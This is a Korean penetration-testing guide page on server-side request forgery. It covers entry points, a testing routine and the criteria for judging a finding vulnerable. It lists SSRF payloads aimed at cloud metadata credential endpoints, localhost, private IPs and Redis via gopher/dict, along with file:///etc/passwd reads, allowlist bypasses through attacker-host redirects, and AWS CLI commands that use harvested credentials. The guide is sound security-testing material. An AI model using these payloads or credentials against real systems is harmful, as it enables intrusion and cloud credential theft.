---
sidebar_position: 28
title: SSRF
description: 웹 진단 - Server-Side Request Forgery 진입점, 응답 판단, 내부망/metadata 접근, 우회 노트
keywords: [SSRF, Server-Side Request Forgery, Blind SSRF, IMDS, metadata, internal network, OWASP A05]
draft: false
toc_max_heading_level: 3
---

## 점검 목적

사용자 입력값이 서버 측 HTTP client, URL fetcher, headless browser, webhook 검증 로직에 그대로 들어가는지 확인. 성공 시 서버 위치에서 외부/내부 URL 요청, 내부망 서비스 접근, cloud metadata credential 조회, 로컬 파일/비HTTP protocol 접근이 가능함.

## 유형 구분

| 유형 | 특징 | 실무 판단 |
| :--- | :--- | :--- |
| **In-band** | 서버가 가져온 응답이 클라이언트 응답에 섞여 나옴 | 외부 페이지, localhost, metadata 응답이 화면/API에 보이는지 확인 |
| **Semi-Blind** | 응답 본문은 없지만 status/length/time 차이가 남음 | 내부 포트별 timeout, 200/403/500, 응답 시간 차이 비교 |
| **Blind** | 응답 차이는 없고 외부 콜백만 확인됨 | Collaborator/interactsh 요청의 DNS/HTTP 로그로 판정 |
| **Stored/Async** | URL 저장 후 백그라운드 작업에서 요청 발생 | 저장 직후가 아니라 썸네일/검증/알림/배치 시점까지 확인 |

---

## 진단 절차

#### Step 1. 진입점 식별

URL을 직접 입력받거나, URL이 포함된 데이터를 서버가 처리하는 기능을 먼저 본다.

- URL 미리보기: OpenGraph, oEmbed, RSS, link preview
- 이미지/파일 fetch: 프로필 이미지 URL, 아이콘 URL, 외부 첨부 URL
- 변환/렌더링: PDF 생성, 스크린샷, headless browser, HTML to image
- Webhook: 등록/검증 요청, 알림 URL, callback URL
- 외부 연동 테스트: Slack/Teams/webhook 테스트, API URL 테스트
- 업로드 후처리: SVG, PDF, Office, XML 내부의 외부 참조
- 관리자 도구: 서버 상태 체크, URL fetch, 프록시 API, 진단 기능

#### Step 2. SSRF 진단 루틴

Burp Repeater에서 정상 URL을 baseline으로 잡고 **외부 콜백 → 응답 노출 → 내부 주소 → metadata → 우회** 순서로 좁힌다.

**1. 외부 콜백 확인**

```text
https://ssrf-<RANDOM>.<COLLAB>.oastify.com/
http://ssrf-<RANDOM>.<COLLAB>.oastify.com/
```

**2. 응답 노출형 확인**

```text
http://example.com/
http://neverssl.com/
```

**3. 내부/로컬 접근 확인**

```text
http://127.0.0.1/
http://localhost/
http://[::1]/
http://127.0.0.1:8080/
http://10.0.0.1/
```

**4. Cloud Metadata 확인**

```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

| 관찰 결과 | 바로 판단 | 다음 행동 |
| :--- | :--- | :--- |
| Collaborator에 DNS/HTTP 요청 수신 | 서버 측 fetch 후보 | source IP, User-Agent, method, header 확인 |
| 외부 HTML이 응답에 그대로 노출 | In-band SSRF 가능성 높음 | localhost/internal/metadata로 확장 |
| 외부 콜백은 오고 응답은 고정 | Blind SSRF 후보 | 내부 포트 time/status 차이 확인 |
| `127.0.0.1`에서 외부와 다른 응답 | 내부 접근 가능 | 포트/서비스 fingerprinting |
| metadata endpoint 응답 노출 | Cloud credential 영향 | role/token/계정 권한 확인 |
| URL scheme이 제한됨 | 필터/allowlist 존재 | redirect, parser mismatch, IP 변형 확인 |
| 브라우저 User-Agent 확인 | headless browser fetch 가능성 | HTML 렌더링, file/screenshot 영향 확인 |

#### Step 3. 컨텍스트별 빠른 선택

입력값이 어떤 fetcher에 들어가는지 먼저 가정하고 payload를 고른다.

| 입력 컨텍스트 | 먼저 넣을 값 | 볼 것 |
| :--- | :--- | :--- |
| 프록시 API: `url=` | `http://example.com/` | 외부 응답이 그대로 반환되는지 |
| 이미지 URL | Collaborator URL, 작은 이미지 URL | 서버가 이미지 검증/다운로드 요청을 보내는지 |
| Webhook URL | Collaborator URL | 등록 시점에 검증 요청이 오는지 |
| PDF/스크린샷 URL | `http://127.0.0.1:8080/` | 렌더링 결과/에러/timeout 차이 |
| URL allowlist | `http://allowed.com@127.0.0.1/` | parser mismatch 여부 |
| Redirect follow | attacker URL → `Location: http://127.0.0.1/` | 서버가 redirect를 따라가는지 |
| Async fetch | unique marker URL | 즉시 응답 이후 콜백이 늦게 오는지 |

#### Step 4. 내부 서비스 식별

응답 본문이 보이면 내용으로, Blind면 status/length/time으로 구분한다.

| 대상 | 확인 URL | 판단 |
| :--- | :--- | :--- |
| Local web | `http://127.0.0.1/`, `:8080`, `:8000` | admin UI, actuator, internal API |
| Redis | `http://127.0.0.1:6379/` | protocol error, timeout 차이 |
| Elasticsearch | `http://127.0.0.1:9200/` | cluster JSON, 401/403 |
| Kibana | `http://127.0.0.1:5601/` | HTML title, redirect |
| Consul | `http://127.0.0.1:8500/` | UI/API 응답 |
| Docker API | `http://127.0.0.1:2375/version` | JSON version |
| Spring Actuator | `http://127.0.0.1:8080/actuator/env` | env/config 노출 |

---

## 페이로드 노트

### 1. 외부 콜백 / fetch 라이브러리 식별

가장 먼저 서버가 실제로 외부 요청을 보내는지 확인한다.

```text
http://ssrf-<RANDOM>.<COLLAB>.oastify.com/
https://ssrf-<RANDOM>.<COLLAB>.oastify.com/pixel.png
```

볼 것:

```text
source IP
DNS only / HTTP까지 도달 여부
HTTP method
User-Agent
X-Forwarded-For / Via
Host header
redirect follow 여부
```

`python-requests`, `Java/`, `Go-http-client`, `curl`, `HeadlessChrome` 같은 User-Agent가 보이면 다음 payload 선택이 쉬워진다.

### 2. In-band 프록시 / 미리보기

서버가 가져온 응답을 그대로 돌려주는 기능은 바로 내부로 확장한다.

```http
GET /api/proxy?url=http://example.com/ HTTP/1.1
Host: <TARGET>

GET /api/proxy?url=http://127.0.0.1:8080/ HTTP/1.1
Host: <TARGET>

GET /api/proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: <TARGET>
```

외부 HTML이 그대로 나오면 fetch 자체는 확정이다. 내부 URL에서 HTML/JSON/에러 문자열이 달라지는지 본다.

### 3. Localhost / 사설 IP

```text
http://127.0.0.1/
http://localhost/
http://[::1]/
http://127.0.0.1:80/
http://127.0.0.1:8080/
http://10.0.0.1/
http://172.16.0.1/
http://192.168.0.1/
```

응답 본문이 없으면 같은 포트에 대해 status, content-length, timeout을 비교한다. 열린 포트는 빠른 실패나 다른 에러를 주고, 닫힌 포트는 timeout으로 떨어지는 경우가 많다.

### 4. AWS Metadata

IMDSv1은 GET만으로 조회된다.

```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/user-data/
```

응답 예시:

```json
{
  "Code": "Success",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-05-12T18:00:00Z"
}
```

IMDSv2는 token 발급용 `PUT`과 `X-aws-ec2-metadata-token` header가 필요하다. SSRF 진입점에서 method/header 제어가 가능하면 확인한다.

```http
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

단순 GET fetcher라면 IMDSv2 token 발급은 막히는 경우가 많다.

### 5. GCP / Azure Metadata

GCP/Azure는 metadata header가 필요하다. SSRF 진입점에서 header를 제어할 수 있는지 먼저 본다.

```text
# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Metadata: true
```

header 제어가 없으면 단순 URL fetch로는 토큰 조회가 안 될 수 있다. 그래도 인스턴스 정보 endpoint가 노출되는지 확인한다.

### 6. URL Parser / Allowlist 우회

필터가 보이면 URL parser가 어느 기준으로 host를 보는지 흔든다.

```text
http://allowed.com@127.0.0.1/
http://allowed.com@169.254.169.254/latest/meta-data/
http://127.0.0.1#allowed.com
http://127.0.0.1?.allowed.com
http://allowed.com.attacker.com/
http://attacker.com/allowed.com
http://127.1/
http://2130706433/
http://0x7f000001/
http://0177.0.0.1/
http://[::ffff:127.0.0.1]/
```

`@` 앞은 userinfo, 뒤가 실제 host다. 검증 로직과 fetch 라이브러리가 서로 다른 parser를 쓰면 우회가 생긴다.

### 7. Redirect 우회

검증은 최초 URL만 보고 fetcher가 redirect를 따라가면 내부 URL로 넘어갈 수 있다.

```http
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/
```

요청값:

```text
http://attacker.example/redirect-to-metadata
```

확인은 최종 응답이 metadata/internal 응답으로 바뀌는지, 또는 Collaborator 로그에서 2차 요청이 발생하는지 본다.

### 8. file / gopher / dict Scheme

라이브러리가 HTTP 외 scheme을 처리할 때만 의미가 있다.

```text
file:///etc/passwd
file:///proc/self/environ
file:///c:/windows/win.ini
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO%0d%0a
```

`file://` 응답이 그대로 나오면 로컬 파일 읽기다. `gopher://`는 내부 서비스에 raw payload를 보낼 수 있을 때 영향이 커진다.

---

## 우회 매트릭스

| 필터 증상 | 우회 방향 | 예시 |
| :--- | :--- | :--- |
| `localhost`, `127.0.0.1` 차단 | IP 변형, IPv6 | `127.1`, `2130706433`, `[::1]` |
| 사설 IP 차단 | DNS rebinding, attacker DNS | `internal.attacker.com` → `127.0.0.1` |
| allowlist 도메인만 허용 | userinfo, subdomain, redirect | `allowed.com@127.0.0.1`, `allowed.com.attacker.com` |
| http/https만 허용 | redirect로 scheme 전환 | `https://attacker/302-to-file` |
| 응답 본문 미노출 | status/time/length 비교 | 내부 포트별 timeout 차이 |
| metadata 차단 | redirect, IPv6/alias, header 제어 확인 | IMDSv2 token/header 가능 여부 |
| DNS만 도달 | Blind SSRF로 판단 | Collaborator DNS 로그 기준 |

---

## 취약 판정 기준

다음 중 하나라도 안정적으로 재현되면 취약으로 본다.

- [ ] 서버에서 Collaborator/interactsh로 DNS 또는 HTTP 요청이 발생함
- [ ] 서버가 가져온 외부 응답이 클라이언트 응답에 노출됨
- [ ] `127.0.0.1`, 사설 IP, 내부 도메인에서 외부와 다른 응답이 확인됨
- [ ] cloud metadata endpoint에서 role, token, instance document, credential이 노출됨
- [ ] 내부 포트별 status/time/length 차이로 서비스 식별이 가능함
- [ ] allowlist가 `@`, redirect, IP 변형, DNS rebinding으로 우회됨
- [ ] `file://` 또는 비HTTP scheme으로 로컬 파일/내부 서비스 접근이 가능함

다음은 후보 또는 보류로 둔다.

- [ ] 클라이언트 브라우저에서만 요청이 발생함
- [ ] 정상 URL fetch 기능에서 외부 요청만 가능하고 내부/metadata 접근이 차단됨
- [ ] OOB 콜백은 있으나 모든 입력에서 고정된 health check가 발생함
- [ ] Open Redirect만 가능하고 서버 측 fetch가 없음

영향도가 올라가는 조건:

- [ ] cloud credential을 획득하고 API 호출 가능
- [ ] 내부 관리자/API/actuator/metadata 응답이 노출됨
- [ ] 내부 포트 스캔으로 서비스 지도가 만들어짐
- [ ] file/gopher 등으로 로컬 파일 또는 내부 서비스 조작 가능
- [ ] Stored/Async 경로에서 관리자 권한 작업자가 트리거함

---

## 블라인드 모의해킹 확장

취약점 진단에서는 콜백 수신이나 내부 응답 차이로 멈추지만, 블라인드 모의해킹에서는 **서버 위치에서 접근 가능한 내부 자산과 credential 사용 가능성**까지 확인한다.

| 단계 | 확인할 것 | 증거 기준 |
| :--- | :--- | :--- |
| 1. 요청 주체 | source IP, User-Agent, VPC/NAT 위치 | Collaborator 로그, cloud IP 대역 |
| 2. 내부 자산 | localhost, 사설 IP, 내부 DNS, 관리 포트 | status/length/time, 응답 샘플 |
| 3. Metadata credential | cloud role, token, temporary credential | role name, credential JSON |
| 4. Credential 사용 | cloud/API 권한으로 실제 조회 가능 여부 | caller identity, bucket/list/read 권한 |
| 5. 체인 확장 | 내부 API, actuator, Redis/ES/Consul 등 | 인증 우회, config/secret 노출 |

### Cloud Credential 사용 확인

AWS metadata credential이 나오면 승인 범위 안에서 caller identity부터 확인한다.

```bash
AWS_ACCESS_KEY_ID=<AccessKeyId> \
AWS_SECRET_ACCESS_KEY=<SecretAccessKey> \
AWS_SESSION_TOKEN=<Token> \
aws sts get-caller-identity
```

권한 범위는 읽기 중심으로 좁혀서 본다.

```bash
aws iam get-user
aws s3 ls
aws s3 ls s3://<BUCKET> --max-items 10
aws secretsmanager list-secrets --max-items 10
aws ssm describe-parameters --max-results 10
```

GCP/Azure token도 caller identity, subscription/project 정보, 제한된 resource list를 먼저 본다.

### 내부 서비스 영향 확인

응답이 보이는 SSRF는 내부 서비스에서 민감 endpoint를 직접 확인한다.

```text
http://127.0.0.1:8080/actuator/env
http://127.0.0.1:8080/actuator/configprops
http://127.0.0.1:9200/_cluster/health
http://127.0.0.1:8500/v1/kv/?recurse
http://127.0.0.1:2375/version
```

Blind SSRF는 포트별 timeout/status 차이로 내부 서비스 지도를 만든다.

```text
http://10.0.0.10:22/
http://10.0.0.10:80/
http://10.0.0.10:443/
http://10.0.0.10:8080/
http://10.0.0.10:9200/
```

### Stored / Async SSRF

웹훅, 이미지 URL, PDF 렌더링처럼 저장 후 처리되는 기능은 트리거 시점을 따라간다.

```text
1. URL 저장
2. 미리보기/검증/배치 실행 시점 확인
3. Collaborator hit 시간 확인
4. 내부 URL로 바꿔 재처리
5. 응답/로그/상태 변화 확인
```

Async 경로는 즉시 응답이 같아도 취약할 수 있다. unique marker를 매번 바꿔 어떤 기능이 언제 요청을 보냈는지 분리한다.

---

## 참고자료

### 공식 및 테스트 가이드

- [OWASP Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger - Server-side request forgery](https://portswigger.net/web-security/ssrf)
- [AWS - Use IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-existing-instances.html)

### 커뮤니티 참고 / 도구

- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [HackTricks - SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
